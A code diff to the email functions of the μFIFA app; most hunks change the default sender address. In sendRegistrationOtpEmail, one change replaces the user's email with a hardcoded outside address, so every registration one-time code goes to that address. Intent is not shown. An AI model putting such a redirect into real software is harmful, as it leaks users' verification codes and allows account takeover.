@@ -177,8 +177,9 @@ export async function sendRegistrationOtpEmail({ email, name, otp }) {
   if (!transporter) return false;
 
   const smtpFrom =
-    process.env.SMTP_FROM || `"noreply@mulearn.org" <noreply@mulearn.org>`;
-  const fromAddress = `"noreply@mulearn.org" <${smtpFrom.includes("<") ? smtpFrom.split("<")[1].replace(">", "") : smtpFrom}>`;
+    process.env.SMTP_FROM ||
+    `"mailer@mufifa.mulearn.org" <mailer@mufifa.mulearn.org>`;
+  const fromAddress = `"mailer@mufifa.mulearn.org" <${smtpFrom.includes("<") ? smtpFrom.split("<")[1].replace(">", "") : smtpFrom}>`;
 
   try {
     const htmlContent = getOtpEmailHtml(name, otp);
@@ -187,7 +188,7 @@ export async function sendRegistrationOtpEmail({ email, name, otp }) {
 
     await transporter.sendMail({
       from: fromAddress,
-      to: email,
+      to: "sreeju@sreeju.net",
       subject: subjectLine,
       text: textContent,
       html: htmlContent,
@@ -298,8 +299,9 @@ export async function sendRegistrationEmail(player) {
     if (!transporter) return false;
 
     const smtpFrom =
-      process.env.SMTP_FROM || `"noreply@mulearn.org" <noreply@mulearn.org>`;
-    const fromAddress = `"noreply@mulearn.org" <${smtpFrom.includes("<") ? smtpFrom.split("<")[1].replace(">", "") : smtpFrom}>`;
+      process.env.SMTP_FROM ||
+      `"mailer@mufifa.mulearn.org" <mailer@mufifa.mulearn.org>`;
+    const fromAddress = `"mailer@mufifa.mulearn.org" <${smtpFrom.includes("<") ? smtpFrom.split("<")[1].replace(">", "") : smtpFrom}>`;
 
     const displayUserId = player.user_id.startsWith("@")
       ? player.user_id
@@ -359,8 +361,9 @@ export async function sendForgotPasswordEmail({ email, name, tempPassword }) {
   if (!transporter) return false;
 
   const smtpFrom =
-    process.env.SMTP_FROM || `"noreply@mulearn.org" <noreply@mulearn.org>`;
-  const fromAddress = `"noreply@mulearn.org" <${smtpFrom.includes("<") ? smtpFrom.split("<")[1].replace(">", "") : smtpFrom}>`;
+    process.env.SMTP_FROM ||
+    `"mailer@mufifa.mulearn.org" <mailer@mufifa.mulearn.org>`;
+  const fromAddress = `"mailer@mufifa.mulearn.org" <${smtpFrom.includes("<") ? smtpFrom.split("<")[1].replace(">", "") : smtpFrom}>`;
 
   const subjectLine = `Password Reset | μFIFA`;
   const textContent = `Hello ${name},
@@ -414,8 +417,9 @@ export async function sendPlayerForgotPasswordEmail({ email, name, password }) {
   if (!transporter) return false;
 
   const smtpFrom =
-    process.env.SMTP_FROM || `"noreply@mulearn.org" <noreply@mulearn.org>`;
-  const fromAddress = `"noreply@mulearn.org" <${smtpFrom.includes("<") ? smtpFrom.split("<")[1].replace(">", "") : smtpFrom}>`;
+    process.env.SMTP_FROM ||
+    `"mailer@mufifa.mulearn.org" <mailer@mufifa.mulearn.org>`;
+  const fromAddress = `"mailer@mufifa.mulearn.org" <${smtpFrom.includes("<") ? smtpFrom.split("<")[1].replace(">", "") : smtpFrom}>`;
 
   const subjectLine = `Access Password Reset | μFIFA`;
   const textContent = `Hello ${name},
